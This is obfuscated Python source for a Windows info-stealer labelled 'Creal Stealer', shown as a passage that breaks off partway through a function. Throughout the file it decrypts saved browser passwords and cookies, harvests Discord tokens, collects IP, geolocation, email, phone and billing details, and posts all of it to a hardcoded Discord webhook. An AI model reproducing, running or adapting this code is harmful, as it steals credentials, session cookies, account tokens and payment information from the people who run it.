import os #line:1
import threading #line:2
from sys import executable #line:3
from sqlite3 import connect as sql_connect #line:4
import re #line:5
from base64 import b64decode #line:6
from json import loads as json_loads ,load #line:7
from ctypes import windll ,wintypes ,byref ,cdll ,Structure ,POINTER ,c_char ,c_buffer #line:8
from urllib .request import Request ,urlopen #line:9
from json import *#line:10
import time #line:11
import shutil #line:12
from zipfile import ZipFile #line:13
import random #line:14
import re #line:15
import subprocess #line:16
hook ="https://discord.com/api/webhooks/1062325960202002482/m0Q0MXKP4dRxmmooDx3LlIu1LyUVsoruKVTERHP6bLm6Og0UdzVoSol7LBaqs-OJmlNM"#line:19
DETECTED =False #line:22
def getip ():#line:24
    OO00OO0000OO00O0O ="None"#line:25
    try :#line:26
        OO00OO0000OO00O0O =urlopen (Request ("https://api.ipify.org")).read ().decode ().strip ()#line:27
    except :#line:28
        pass #line:29
    return OO00OO0000OO00O0O #line:30
requirements =[["requests","requests"],["Crypto.Cipher","pycryptodome"]]#line:35
for modl in requirements :#line:36
    try :__import__ (modl [0 ])#line:37
    except :#line:38
        subprocess .Popen (f"{executable} -m pip install {modl[1]}",shell =True )#line:39
        time .sleep (3 )#line:40
import requests #line:42
from Crypto .Cipher import AES #line:43
local =os .getenv ('LOCALAPPDATA')#line:45
roaming =os .getenv ('APPDATA')#line:46
temp =os .getenv ("TEMP")#line:47
Threadlist =[]#line:48
class DATA_BLOB (Structure ):#line:51
    _fields_ =[('cbData',wintypes .DWORD ),('pbData',POINTER (c_char ))]#line:55
def GetData (O0OO0OO0OO0OO0O0O ):#line:57
    OO000O0O000O00O0O =int (O0OO0OO0OO0OO0O0O .cbData )#line:58
    OOO00O00OO00O0000 =O0OO0OO0OO0OO0O0O .pbData #line:59
    O0O0000OO000O0000 =c_buffer (OO000O0O000O00O0O )#line:60
    cdll .msvcrt .memcpy (O0O0000OO000O0000 ,OOO00O00OO00O0000 ,OO000O0O000O00O0O )#line:61
    windll .kernel32 .LocalFree (OOO00O00OO00O0000 )#line:62
    return O0O0000OO000O0000 .raw #line:63
def CryptUnprotectData (OO0O0OO0O0O0OO00O ,entropy =b''):#line:65
    OOO00000OO000OO00 =c_buffer (OO0O0OO0O0O0OO00O ,len (OO0O0OO0O0O0OO00O ))#line:66
    O000O0OO0O0OOOOO0 =c_buffer (entropy ,len (entropy ))#line:67
    O0OO0O0OOOOOO0O0O =DATA_BLOB (len (OO0O0OO0O0O0OO00O ),OOO00000OO000OO00 )#line:68
    OOOO00O00O0O0O00O =DATA_BLOB (len (entropy ),O000O0OO0O0OOOOO0 )#line:69
    O0OOO00000O00OOO0 =DATA_BLOB ()#line:70
    if windll .crypt32 .CryptUnprotectData (byref (O0OO0O0OOOOOO0O0O ),None ,byref (OOOO00O00O0O0O00O ),None ,None ,0x01 ,byref (O0OOO00000O00OOO0 )):#line:72
        return GetData (O0OOO00000O00OOO0 )#line:73
def DecryptValue (OO000OO00000O0OOO ,master_key =None ):#line:75
    O00O00OOOOO0OO000 =OO000OO00000O0OOO .decode (encoding ='utf8',errors ='ignore')[:3 ]#line:76
    if O00O00OOOOO0OO000 =='v10'or O00O00OOOOO0OO000 =='v11':#line:77
        O0O0OOOOOO0O00OOO =OO000OO00000O0OOO [3 :15 ]#line:78
        O00OO0OO0O00OO000 =OO000OO00000O0OOO [15 :]#line:79
        OOOOO0O00O0OO00OO =AES .new (master_key ,AES .MODE_GCM ,O0O0OOOOOO0O00OOO )#line:80
        OO00OOOO00O0OO00O =OOOOO0O00O0OO00OO .decrypt (O00OO0OO0O00OO000 )#line:81
        OO00OOOO00O0OO00O =OO00OOOO00O0OO00O [:-16 ].decode ()#line:82
        return OO00OOOO00O0OO00O #line:83
def LoadRequests (O0O000O00OO0OO0OO ,OO000000000O0OO00 ,data ='',files ='',headers =''):#line:85
    for OOOO0OO00O0O0O0OO in range (8 ):#line:86
        try :#line:87
            if O0O000O00OO0OO0OO =='POST':#line:88
                if data !='':#line:89
                    OO0OOO00O000OO00O =requests .post (OO000000000O0OO00 ,data =data )#line:90
                    if OO0OOO00O000OO00O .status_code ==200 :#line:91
                        return OO0OOO00O000OO00O #line:92
                elif files !='':#line:93
                    OO0OOO00O000OO00O =requests .post (OO000000000O0OO00 ,files =files )#line:94
                    if OO0OOO00O000OO00O .status_code ==200 or OO0OOO00O000OO00O .status_code ==413 :#line:95
                        return OO0OOO00O000OO00O #line:96
        except :#line:97
            pass #line:98
def LoadUrlib (O00O00OOO0O0O0000 ,data ='',files ='',headers =''):#line:100
    for OO00OOOOOO00O00OO in range (8 ):#line:101
        try :#line:102
            if headers !='':#line:103
                OOOO0OO0000O00O00 =urlopen (Request (O00O00OOO0O0O0000 ,data =data ,headers =headers ))#line:104
                return OOOO0OO0000O00O00 #line:105
            else :#line:106
                OOOO0OO0000O00O00 =urlopen (Request (O00O00OOO0O0O0000 ,data =data ))#line:107
                return OOOO0OO0000O00O00 #line:108
        except :#line:109
            pass #line:110
def globalInfo ():#line:112
    OO0OOOO00OO000OOO =getip ()#line:113
    O0000O00OOO00O000 =os .getenv ("USERNAME")#line:114
    O000OO00O0O0O0O00 =urlopen (Request (f"https://geolocation-db.com/jsonp/{OO0OOOO00OO000OOO}")).read ().decode ().replace ('callback(','').replace ('})','}')#line:115
    OO00O0OO000O0000O =loads (O000OO00O0O0O0O00 )#line:117
    OO0O00O0O0OOO000O =OO00O0OO000O0000O ["country_name"]#line:119
    O0O0O0O0OO0000OOO =OO00O0OO000O0000O ["country_code"].lower ()#line:120
    OO00000O0OO00000O =OO00O0OO000O0000O ["state"]#line:121
    O000O000OO000O0O0 =f":flag_{O0O0O0O0OO0000OOO}:  - `{O0000O00OOO00O000.upper()} | {OO0OOOO00OO000OOO} ({OO0O00O0O0OOO000O})`"#line:123
    return O000O000OO000O0O0 #line:124
def Trust (O0O0OOO0O0O0O00O0 ):#line:127
    global DETECTED #line:129
    O0O0OOOO0O0O0O00O =str (O0O0OOO0O0O0O00O0 )#line:130
    OO0OO0OOOOO0000O0 =re .findall (".google.com",O0O0OOOO0O0O0O00O )#line:131
    if len (OO0OO0OOOOO0000O0 )<-1 :#line:133
        DETECTED =True #line:134
        return DETECTED #line:135
    else :#line:136
        DETECTED =False #line:137
        return DETECTED #line:138
def GetUHQFriends (O0OOOO000O0O0OO00 ):#line:140
    OO0OOO0OOOOO0O00O =[{"Name":'Early_Verified_Bot_Developer','Value':131072 ,'Emoji':"<:developer:874750808472825986> "},{"Name":'Bug_Hunter_Level_2','Value':16384 ,'Emoji':"<:bughunter_2:874750808430874664> "},{"Name":'Early_Supporter','Value':512 ,'Emoji':"<:early_supporter:874750808414113823> "},{"Name":'House_Balance','Value':256 ,'Emoji':"<:balance:874750808267292683> "},{"Name":'House_Brilliance','Value':128 ,'Emoji':"<:brilliance:874750808338608199> "},{"Name":'House_Bravery','Value':64 ,'Emoji':"<:bravery:874750808388952075> "},{"Name":'Bug_Hunter_Level_1','Value':8 ,'Emoji':"<:bughunter_1:874750808426692658> "},{"Name":'HypeSquad_Events','Value':4 ,'Emoji':"<:hypesquad_events:874750808594477056> "},{"Name":'Partnered_Server_Owner','Value':2 ,'Emoji':"<:partner:874750808678354964> "},{"Name":'Discord_Employee','Value':1 ,'Emoji':"<:staff:874750808728666152> "}]#line:152
    O0O00OO0OO0O000OO ={"Authorization":O0OOOO000O0O0OO00 ,"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}#line:157
    try :#line:158
        OOO000OOOOO0O0OO0 =loads (urlopen (Request ("https://discord.com/api/v6/users/@me/relationships",headers =O0O00OO0OO0O000OO )).read ().decode ())#line:159
    except :#line:160
        return False #line:161
    O00O0O0O00O0O0OO0 =''#line:163
    for O00OOO00000000OOO in OOO000OOOOO0O0OO0 :#line:164
        OO0O0O0O0OO000OOO =''#line:165
        OOO000O00OO0000OO =O00OOO00000000OOO ['user']['public_flags']#line:166
        for O00000OO000OOO00O in OO0OOO0OOOOO0O00O :#line:167
            if OOO000O00OO0000OO //O00000OO000OOO00O ["Value"]!=0 and O00OOO00000000OOO ['type']==1 :#line:168
                if not "House"in O00000OO000OOO00O ["Name"]:#line:169
                    OO0O0O0O0OO000OOO +=O00000OO000OOO00O ["Emoji"]#line:170
                OOO000O00OO0000OO =OOO000O00OO0000OO %O00000OO000OOO00O ["Value"]#line:171
        if OO0O0O0O0OO000OOO !='':#line:172
            O00O0O0O00O0O0OO0 +=f"{OO0O0O0O0OO000OOO} | {O00OOO00000000OOO['user']['username']}#{O00OOO00000000OOO['user']['discriminator']} ({O00OOO00000000OOO['user']['id']})\n"#line:173
    return O00O0O0O00O0O0OO0 #line:174
def GetBilling (OOO0OO0O0OOO0000O ):#line:176
    OO0OOO00OOO0000OO ={"Authorization":OOO0OO0O0OOO0000O ,"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}#line:181
    try :#line:182
        OO0OOO0O00O0O000O =loads (urlopen (Request ("https://discord.com/api/users/@me/billing/payment-sources",headers =OO0OOO00OOO0000OO )).read ().decode ())#line:183
    except :#line:184
        return False #line:185
    if OO0OOO0O00O0O000O ==[]:return "```None```"#line:187
    O0OOOO0OO000OOO00 =""#line:189
    for OO00OO0O0O00000OO in OO0OOO0O00O0O000O :#line:190
        if OO00OO0O0O00000OO ["invalid"]==False :#line:191
            if OO00OO0O0O00000OO ["type"]==1 :#line:192
                O0OOOO0OO000OOO00 +=":credit_card:"#line:193
            elif OO00OO0O0O00000OO ["type"]==2 :#line:194
                O0OOOO0OO000OOO00 +=":parking: "#line:195
    return O0OOOO0OO000OOO00 #line:197
def GetBadge (OO0000O0O0O0O0O00 ):#line:200
    if OO0000O0O0O0O0O00 ==0 :return ''#line:201
    OO0O0O000OOOOO000 =''#line:203
    O00OOO0OO0000OOOO =[{"Name":'Early_Verified_Bot_Developer','Value':131072 ,'Emoji':"<:developer:874750808472825986> "},{"Name":'Bug_Hunter_Level_2','Value':16384 ,'Emoji':"<:bughunter_2:874750808430874664> "},{"Name":'Early_Supporter','Value':512 ,'Emoji':"<:early_supporter:874750808414113823> "},{"Name":'House_Balance','Value':256 ,'Emoji':"<:balance:874750808267292683> "},{"Name":'House_Brilliance','Value':128 ,'Emoji':"<:brilliance:874750808338608199> "},{"Name":'House_Bravery','Value':64 ,'Emoji':"<:bravery:874750808388952075> "},{"Name":'Bug_Hunter_Level_1','Value':8 ,'Emoji':"<:bughunter_1:874750808426692658> "},{"Name":'HypeSquad_Events','Value':4 ,'Emoji':"<:hypesquad_events:874750808594477056> "},{"Name":'Partnered_Server_Owner','Value':2 ,'Emoji':"<:partner:874750808678354964> "},{"Name":'Discord_Employee','Value':1 ,'Emoji':"<:staff:874750808728666152> "}]#line:215
    for O000OOO0O00OO0OOO in O00OOO0OO0000OOOO :#line:216
        if OO0000O0O0O0O0O00 //O000OOO0O00OO0OOO ["Value"]!=0 :#line:217
            OO0O0O000OOOOO000 +=O000OOO0O00OO0OOO ["Emoji"]#line:218
            OO0000O0O0O0O0O00 =OO0000O0O0O0O0O00 %O000OOO0O00OO0OOO ["Value"]#line:219
    return OO0O0O000OOOOO000 #line:221
def GetTokenInfo (OOOO0OOO00O000O00 ):#line:223
    OO0OOOOO000OOO0O0 ={"Authorization":OOOO0OOO00O000O00 ,"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}#line:228
    OO000000OO0O0O00O =loads (urlopen (Request ("https://discordapp.com/api/v6/users/@me",headers =OO0OOOOO000OOO0O0 )).read ().decode ())#line:230
    OOOO0OOO0O00OO0O0 =OO000000OO0O0O00O ["username"]#line:231
    OO00OO0O0OO00O0O0 =OO000000OO0O0O00O ["discriminator"]#line:232
    OO0000OO0OO0OOO00 =OO000000OO0O0O00O ["email"]#line:233
    O00OO00OO00OO0000 =OO000000OO0O0O00O ["id"]#line:234
    O0000OOOOO00000O0 =OO000000OO0O0O00O ["avatar"]#line:235
    O0OO00O0O00O0O0OO =OO000000OO0O0O00O ["public_flags"]#line:236
    OO0O0O0000OO00O0O =""#line:237
    OOOOO0O00O0OO0000 =""#line:238
    if "premium_type"in OO000000OO0O0O00O :#line:240
        OO00OO00O000000OO =OO000000OO0O0O00O ["premium_type"]#line:241
        if OO00OO00O000000OO ==1 :#line:242
            OO0O0O0000OO00O0O ="<a:DE_BadgeNitro:865242433692762122>"#line:243
        elif OO00OO00O000000OO ==2 :#line:244
            OO0O0O0000OO00O0O ="<a:DE_BadgeNitro:865242433692762122><a:autr_boost1:1038724321771786240>"#line:245
    if "phone"in OO000000OO0O0O00O :OOOOO0O00O0OO0000 =f'{OO000000OO0O0O00O["phone"]}'#line:246
    return OOOO0OOO0O00OO0O0 ,OO00OO0O0OO00O0O0 ,OO0000OO0OO0OOO00 ,O00OO00OO00OO0000 ,O0000OOOOO00000O0 ,O0OO00O0O00O0O0OO ,OO0O0O0000OO00O0O ,OOOOO0O00O0OO0000 #line:248
def checkToken (O00OOO00OO00O0OOO ):#line:250
    OOO0OOOOOO0O0O00O ={"Authorization":O00OOO00OO00O0OOO ,"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}#line:255
    try :#line:256
        urlopen (Request ("https://discordapp.com/api/v6/users/@me",headers =OOO0OOOOOO0O0O00O ))#line:257
        return True #line:258
    except :#line:259
        return False #line:260
def uploadToken (OO000O0OOOOOOOO0O ,O0O00O00O0OOO0O0O ):#line:262
    global hook #line:263
    global tgmkx #line:264
    OO0OO0O0O0000OOO0 ={"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}#line:268
    OOO000OOOO0O0OOOO ,O00OOO0OOO00O0O00 ,OO0000O00OOOOOOOO ,OO00000OO00OOO0OO ,O0OO00OO0OOO0O00O ,O00OO0OO000OO000O ,O0OO0OOO0O0OO0O0O ,OO0O00O0O0O00000O =GetTokenInfo (OO000O0OOOOOOOO0O )#line:269
    if O0OO00OO0OOO0O00O ==None :#line:271
        O0OO00OO0OOO0O00O ="https://cdn.discordapp.com/attachments/1050492593114456124/1051490320921145384/786713106658492416.webp"#line:272
    else :#line:273
        O0OO00OO0OOO0O00O =f"https://cdn.discordapp.com/avatars/{OO00000OO00OOO0OO}/{O0OO00OO0OOO0O00O}"#line:274
    OO000000OOOO0OOOO =GetBilling (OO000O0OOOOOOOO0O )#line:276
    O0000O00O0O0OOO0O =GetBadge (O00OO0OO000OO000O )#line:277
    OOO0O000000OOO00O =GetUHQFriends (OO000O0OOOOOOOO0O )#line:278
    if OOO0O000000OOO00O =='':OOO0O000000OOO00O ="```No Rare Friends```"#line:279
    if not OO000000OOOO0OOOO :#line:280
        O0000O00O0O0OOO0O ,OO0O00O0O0O00000O ,OO000000OOOO0OOOO ="🔒","🔒","🔒"#line:281
    if O0OO0OOO0O0OO0O0O ==''and O0000O00O0O0OOO0O =='':O0OO0OOO0O0OO0O0O ="```None```"#line:282
    OO0O0O000O0O0O0O0 ={"content":f'{globalInfo()} | `{O0O00O00O0OOO0O0O}`',"embeds":[{"color":0000000 ,"fields":[{"name":"<a:hyperNOPPERS:828369518199308388> Token:","value":f"```{OO000O0OOOOOOOO0O}```","inline":True },{"name":"<:mail:750393870507966486> Email:","value":f"```{OO0000O00OOOOOOOO}```","inline":True },{"name":"<a:1689_Ringing_Phone:755219417075417088> Phone:","value":f"```{OO0O00O0O0O00000O}```","inline":True },{"name":"<:mc_earth:589630396476555264> IP:","value":f"```{getip()}```","inline":True },{"name":"<:woozyface:874220843528486923> Badges:","value":f"{O0OO0OOO0O0OO0O0O}{O0000O00O0O0OOO0O}","inline":True },{"name":"<a:4394_cc_creditcard_cartao_f4bihy:755218296801984553> Billing:","value":f"{OO000000OOOO0OOOO}","inline":True },{"name":"<a:mavikirmizi:853238372591599617> HQ Friends:","value":f"{OOO0O000000OOO00O}","inline":False }],"author":{"name":f"{OOO000OOOO0O0OOOO}#{O00OOO0OOO00O0O00} ({OO00000OO00OOO0OO})","icon_url":f"{O0OO00OO0OOO0O00O}"},"footer":{"text":"Creal Stealer","icon_url":"https://cdn.discordapp.com/attachments/1050492593114456124/1051490320921145384/786713106658492416.webp"},"thumbnail":{"url":f"{O0OO00OO0OOO0O00O}"}}],"avatar_url":"https://cdn.discordapp.com/attachments/1050492593114456124/1051490320921145384/786713106658492416.webp","username":"Creal Stealer","attachments":[]}#line:342
    LoadUrlib (hook ,data =dumps (OO0O0O000O0O0O0O0 ).encode (),headers =OO0OO0O0O0000OOO0 )#line:343
def Reformat (O00O0OOOOOOO00OOO ):#line:346
    O0OO0000OOO00OO00 =re .findall ("(\w+[a-z])",O00O0OOOOOOO00OOO )#line:347
    while "https"in O0OO0000OOO00OO00 :O0OO0000OOO00OO00 .remove ("https")#line:348
    while "com"in O0OO0000OOO00OO00 :O0OO0000OOO00OO00 .remove ("com")#line:349
    while "net"in O0OO0000OOO00OO00 :O0OO0000OOO00OO00 .remove ("net")#line:350
    return list (set (O0OO0000OOO00OO00 ))#line:351
def upload (OO000O0O00OO000O0 ,O0OOO00O0000OOO0O ):#line:353
    OOO0O0OOOOO00000O ={"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}#line:357
    if OO000O0O00OO000O0 =="wpcook":#line:359
        OOOO0OO0O0000OOO0 =' | '.join (O0OOOOO0000OOOOOO for O0OOOOO0000OOOOOO in cookiWords )#line:360
        if len (OOOO0OO0O0000OOO0 )>1000 :#line:361
            O00O0O00OOO0O0000 =Reformat (str (cookiWords ))#line:362
            OOOO0OO0O0000OOO0 =' | '.join (OOOOOO00000O00OOO for OOOOOO00000O00OOO in O00O0O00OOO0O0000 )#line:363
        O00000OOOO00OO0OO ={"content":f"{globalInfo()}","embeds":[{"title":"Creal | Cookies Stealer","description":f"<:apollondelirmis:1012370180845883493>: **Accounts:**\n\n{OOOO0OO0O0000OOO0}\n\n**Data:**\n<:cookies_tlm:816619063618568234> • **{CookiCount}** Cookies Found\n<a:CH_IconArrowRight:715585320178941993> • [CrealCookies.txt]({O0OOO00O0000OOO0O})","color":000000 ,"footer":{"text":"Creal Stealer","icon_url":"https://cdn.discordapp.com/attachments/1050492593114456124/1051490320921145384/786713106658492416.webp"}}],"username":"Creal Stealer","avatar_url":"https://cdn.discordapp.com/attachments/1050492593114456124/1051490320921145384/786713106658492416.webp","attachments":[]}#line:380
        LoadUrlib (hook ,data =dumps (O00000OOOO00OO0OO ).encode (),headers =OOO0O0OOOOO00000O )#line:381
        return #line:382
    if OO000O0O00OO000O0 =="wppassw":#line:384
        OO0OOO0O00O00OO00 =' | '.join (O000O0OOOO0000OOO for O000O0OOOO0000OOO in paswWords )#line:385
        if len (OO0OOO0O00O00OO00 )>1000 :#line:386
            OO00O00OO000OOOOO =Reformat (str (paswWords ))#line:387
            OO0OOO0O00O00OO00 =' | '.join (OOOOO0OO00O0OOOO0 for OOOOO0OO00O0OOOO0 in OO00O00OO000OOOOO )#line:388
        O00000OOOO00OO0OO ={"content":f"{globalInfo()}","embeds":[{"title":"Creal | Password Stealer","description":f"<:apollondelirmis:1012370180845883493>: **Accounts**:\n{OO0OOO0O00O00OO00}\n\n**Data:**\n<a:hira_kasaanahtari:886942856969875476> • **{PasswCount}** Passwords Found\n<a:CH_IconArrowRight:715585320178941993> • [CrealPassword.txt]({O0OOO00O0000OOO0O})","color":000000 ,"footer":{"text":"Creal Stealer","icon_url":"https://cdn.discordapp.com/attachments/1050492593114456124/1051490320921145384/786713106658492416.webp"}}],"username":"Creal","avatar_url":"https://cdn.discordapp.com/attachments/1050492593114456124/1051490320921145384/786713106658492416.webp","attachments":[]}#line:406
        LoadUrlib (hook ,data =dumps (O00000OOOO00OO0OO ).encode (),headers =OOO0O0OOOOO00000O )#line:407
        return #line:408
    if OO000O0O00OO000O0 =="kiwi":#line:410
        O00000OOOO00OO0OO ={"content":f"{globalInfo()}","embeds":[{"color":000000 ,"fields":[{"name":"Interesting files found on user PC:","value":O0OOO00O0000OOO0O }],"author":{"name":"Creal | File Stealer"},"footer":{"text":"Creal Stealer","icon_url":"https://cdn.discordapp.com/attachments/1050492593114456124/1051490320921145384/786713106658492416.webp"}}],"username":"Creal Stealer","avatar_url":"https://cdn.discordapp.com/attachments/1050492593114456124/1051490320921145384/786713106658492416.webp","attachments":[]}#line:434
        LoadUrlib (hook ,data =dumps (O00000OOOO00OO0OO ).encode (),headers =OOO0O0OOOOO00000O )#line:435
        return #line:436
    _ #line:449
def writeforfile (OOOO0000O00OO00O0 ,OO0O0OO00O00OO0OO ):#line:454
    O000O000000OO0000 =os .getenv ("TEMP")+f"\wp{OO0O0OO00O00OO0OO}.txt"#line:455
    with open (O000O000000OO0000 ,mode ='w',encoding ='utf-8')as OO0O0O0000O00OOO0 :#line:456
        OO0O0O0000O00OOO0 .write (f"<--Creal STEALER BEST -->\n\n")#line:457
        for OOO000OO0O0OO0000 in OOOO0000O00OO00O0 :#line:458
            if OOO000OO0O0OO0000 [0 ]!='':#line:459
                OO0O0O0000O00OOO0 .write (f"{OOO000OO0O0OO0000}\n")#line:460
Tokens =''#line:462
def getToken (OOOOOO000O0OOOOO0 ,O0OO000000OOOOO0O ):#line:463
    if not os .path .exists (OOOOOO000O0OOOOO0 ):return #line:464
    OOOOOO000O0OOOOO0 +=O0OO000000OOOOO0O #line:466
    for OOOO000OO00000O00 in os .listdir (OOOOOO000O0OOOOO0 ):#line:467
        if OOOO000OO00000O00 .endswith (".log")or OOOO000OO00000O00 .endswith (".ldb"):#line:468
            for O00OOOO0O00O00O00 in [OOOO0O0O00OOOO000 .strip ()for OOOO0O0O00OOOO000 in open (f"{OOOOOO000O0OOOOO0}\\{OOOO000OO00000O00}",errors ="ignore").readlines ()if OOOO0O0O00OOOO000 .strip ()]:#line:469
                for OOO00O00O000O00O0 in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}",r"mfa\.[\w-]{80,95}"):#line:470
                    for O00OO0O0OO0O00OO0 in re .findall (OOO00O00O000O00O0 ,O00OOOO0O00O00O00 ):#line:471
                        global Tokens #line:472
                        if checkToken (O00OO0O0OO0O00OO0 ):#line:473
                            if not O00OO0O0OO0O00OO0 in Tokens :#line:474
                                Tokens +=O00OO0O0OO0O00OO0 #line:476
                                uploadToken (O00OO0O0OO0O00OO0 ,OOOOOO000O0OOOOO0 )#line:477
Passw =[]#line:479
def getPassw (OO0OO00OOOOOOOO00 ,OOO0000000O00O0OO ):#line:480
    global Passw ,PasswCount #line:481
    if not os .path .exists (OO0OO00OOOOOOOO00 ):return #line:482
    O0O0O00000OO0OO00 =OO0OO00OOOOOOOO00 +OOO0000000O00O0OO +"/Login Data"#line:484
    if os .stat (O0O0O00000OO0OO00 ).st_size ==0 :return #line:485
    O000OO0OO00OO00O0 =temp +"wp"+''.join (random .choice ('bcdefghijklmnopqrstuvwxyz')for OO00OO0OO0OOO0OO0 in range (8 ))+".db"#line:487
    shutil .copy2 (O0O0O00000OO0OO00 ,O000OO0OO00OO00O0 )#line:489
    OO0OO0O0OOO0O0OO0 =sql_connect (O000OO0OO00OO00O0 )#line:490
    OOO0OOOO0O0OO00O0 =OO0OO0O0OOO0O0OO0 .cursor ()#line:491
    OOO0OOOO0O0OO00O0 .execute ("SELECT action_url, username_value, password_value FROM logins;")#line:492
    OOOOOOO00O00OOOO0 =OOO0OOOO0O0OO00O0 .fetchall ()#line:493
    OOO0OOOO0O0OO00O0 .close ()#line:494
    OO0OO0O0OOO0O0OO0 .close ()#line:495
    os .remove (O000OO0OO00OO00O0 )#line:496
    O0OO0O00OO0O000O0 =OO0OO00OOOOOOOO00 +"/Local State"#line:498
    with open (O0OO0O00OO0O000O0 ,'r',encoding ='utf-8')as OO00000O0O0O0OOO0 :O00O00000O0O0OOO0 =json_loads (OO00000O0O0O0OOO0 .read ())#line:499
    OO0OOOOO0OOO0O0OO =b64decode (O00O00000O0O0OOO0 ['os_crypt']['encrypted_key'])#line:500
    OO0OOOOO0OOO0O0OO =CryptUnprotectData (OO0OOOOO0OOO0O0OO [5 :])#line:501
    for OO0OO00000OO0O0O0 in OOOOOOO00O00OOOO0 :#line:503
        if OO0OO00000OO0O0O0 [0 ]!='':#line:504
            for O000OO0O0OO00O000 in keyword :#line:505
                OO000OO0O00O000O0 =O000OO0O0OO00O000 #line:506
                if "https"in O000OO0O0OO00O000 :#line:507
                    O00O0O00OO0OOO00O =O000OO0O0OO00O000 #line:508
                    O000OO0O0OO00O000 =O00O0O00OO0OOO00O .split ('[')[1 ].split (']')[0 ]#line:509
                if O000OO0O0OO00O000 in OO0OO00000OO0O0O0 [0 ]:#line:510
                    if not OO000OO0O00O000O0 in paswWords :paswWords .append (OO000OO0O00O000O0 )#line:511
            Passw .append (f"UR1: {OO0OO00000OO0O0O0[0]} | U53RN4M3: {OO0OO00000OO0O0O0[1]} | P455W0RD: {DecryptValue(OO0OO00000OO0O0O0[2], OO0OOOOO0OOO0O0OO)}")#line:512
            PasswCount +=1 #line:513
    writeforfile (Passw ,'passw')#line:514
Cookies =[]#line:516
def getCookie (OOO0O00OOOOOOOO00 ,OOOOOO0OOOO0O00OO ):#line:517
    global Cookies ,CookiCount #line:518
    if not os .path .exists (OOO0O00OOOOOOOO00 ):return #line:519
    OO00OO0OO0OOOOOO0 =OOO0O00OOOOOOOO00 +OOOOOO0OOOO0O00OO +"/Cookies"#line:521
    if os .stat (OO00OO0OO0OOOOOO0 ).st_size ==0 :return #line:522
    OO0OO000OO000O0OO =temp +"wp"+''.join (random .choice ('bcdefghijklmnopqrstuvwxyz')for O0OO0OOO000O0O00O in range (8 ))+".db"#line:524
    shutil .copy2 (OO00OO0OO0OOOOOO0 ,OO0OO000OO000O0OO )#line:526
    O00O000O000000OO0 =sql_connect (OO0OO000OO000O0OO )#line:527
    O0OO000O00OO0O000 =O00O000O000000OO0 .cursor ()#line:528
    O0OO000O00OO0O000 .execute ("SELECT host_key, name, encrypted_value FROM cookies")#line:529
    O000OOOO00O0O0OOO =O0OO000O00OO0O000 .fetchall ()#line:530
    O0OO000O00OO0O000 .close ()#line:531
    O00O000O000000OO0 .close ()#line:532
    os .remove (OO0OO000OO000O0OO )#line:533
    OO0O0OOOO0OOOO000 =OOO0O00OOOOOOOO00 +"/Local State"#line:535
    with open (OO0O0OOOO0OOOO000 ,'r',encoding ='utf-8')as O0O0000OOO000OO00 :O0OOO0000O000OO00 =json_loads (O0O0000OOO000OO00 .read ())#line:537
    O000OOO000O0O0O0O =b64decode (O0OOO0000O000OO00 ['os_crypt']['encrypted_key'])#line:538
    O000OOO000O0O0O0O =CryptUnprotectData (O000OOO000O0O0O0O [5 :])#line:539
    for OO000OO000O0O00O0 in O000OOOO00O0O0OOO :#line:541
        if OO000OO000O0O00O0 [0 ]!='':#line:542
            for OO0O0O0OOOOOOOOO0 in keyword :#line:543
                OOO00O000OO0O000O =OO0O0O0OOOOOOOOO0 #line:544
                if "https"in OO0O0O0OOOOOOOOO0 :#line:545
                    O000O00OOO000O00O =OO0O0O0OOOOOOOOO0 #line:546
                    OO0O0O0OOOOOOOOO0 =O000O00OOO000O00O .split ('[')[1 ].split (']')[0 ]#line:547
                if OO0O0O0OOOOOOOOO0 in OO000OO000O0O00O0 [0 ]:#line:548
                    if not OOO00O000OO0O000O in cookiWords :cookiWords .append (OOO00O000OO0O000O )#line:549
            Cookies .append (f"{OO000OO000O0O00O0[0]}	TRUE	/	FALSE	2597573456	{OO000OO000O0O00O0[1]}	{DecryptValue(OO000OO000O0O00O0[2], O000OOO000O0O0O0O)}")#line:550
            CookiCount +=1 #line:551
    writeforfile (Cookies ,'cook')#line:552
def GetDiscord (OO0OOO00O0OO0O0OO ,O0O000OO00000OO0O ):#line:554
    if not os .path .exists (f"{OO0OOO00O0OO0O0OO}/Local State"):return #line:555
    OOOOO0OO0OO0O0OOO =OO0OOO00O0OO0O0OO +O0O000OO00000OO0O #line:557
    O00OOOOO000OOO0O0 =OO0OOO00O0OO0O0OO +"/Local State"#line:559
    with open (O00OOOOO000OOO0O0 ,'r',encoding ='utf-8')as OOOO0OOOOOOOO00O0 :O00OOOO0O0O0OOO00 =json_loads (OOOO0OOOOOOOO00O0 .read ())#line:560
    O000O00000O0O0000 =b64decode (O00OOOO0O0O0OOO00 ['os_crypt']['encrypted_key'])#line:561
    O000O00000O0O0000 =CryptUnprotectData (O000O00000O0O0000 [5 :])#line:562
    for O0OO0OOO0OO00O0O0 in os .listdir (OOOOO0OO0OO0O0OOO ):#line:565
        if O0OO0OOO0OO00O0O0 .endswith (".log")or O0OO0OOO0OO00O0O0 .endswith (".ldb"):#line:567
            for O00O0O0O00O0OOO00 in [OO0OO00O0O0O0O0OO .strip ()for OO0OO00O0O0O0O0OO in open (f"{OOOOO0OO0OO0O0OOO}\\{O0OO0OOO0OO00O0O0}",errors ="ignore").readlines ()if OO0OO00O0O0O0O0OO .strip ()]:#line:568
                for OO0O0O0O0OOO00000 in re .findall (r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*",O00O0O0O00O0OOO00 ):#line:569
                    global Tokens #line:570
                    O0O000O000O0000OO =DecryptValue (b64decode (OO0O0O0O0OOO00000 .split ('dQw4w9WgXcQ:')[1 ]),O000O00000O0O0000 )#line:571
                    if checkToken (O0O000O000O0000OO ):#line:572
                        if not O0O000O000O0000OO in Tokens :#line:573
